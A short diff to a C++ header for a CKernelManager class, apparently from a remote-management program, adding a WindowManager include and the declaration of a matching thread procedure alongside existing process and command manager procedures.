@@ -6,6 +6,7 @@
 #include"SystemHelper.h"
 #include"ProcessManager.h"
 #include"CmdManager.h"
+#include"WindowManager.h"
 class CKernelManager:public CManager
 {
 public:
@@ -20,3 +21,4 @@ private:
 DWORD WINAPI InstantMessageProcedure(LPVOID ParameterData);
 DWORD WINAPI ProcessManagerProcedure(LPVOID ParameterData);
 DWORD WINAPI CmdManagerProcedure(LPVOID ParameterData);
+DWORD WINAPI WindowManagerProcedure(LPVOID ParameterData);
